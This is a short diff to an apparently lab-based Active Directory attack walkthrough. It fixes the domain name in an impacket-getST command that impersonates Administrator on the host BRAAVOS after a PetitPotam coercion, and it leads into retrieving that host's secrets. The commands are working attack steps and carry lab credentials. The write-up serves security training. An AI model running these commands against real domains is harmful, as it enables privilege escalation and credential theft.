@@ -116,7 +116,7 @@ python3 PetitPotam.py -u khal.drogo -p horse 192.168.56.129 braavos.essos.local
 The attack worked we can now exploit braavos with RBCD
 
 ```bash
-impacket-getST -spn HOST/BRAAVOS.ESSOS.LOCAL -impersonate Administrator -dc-ip 192.168.56.12 'ESSOS/AUTBHVFM$:uvEGGJ+$7g3}Bb*'
+impacket-getST -spn HOST/BRAAVOS.ESSOS.LOCAL -impersonate Administrator -dc-ip 192.168.56.12 'ESSOS.LOCAL/AUTBHVFM$:uvEGGJ+$7g3}Bb*'
 ```
 
 Use that ticket to retreive secrets on BRAAVOS
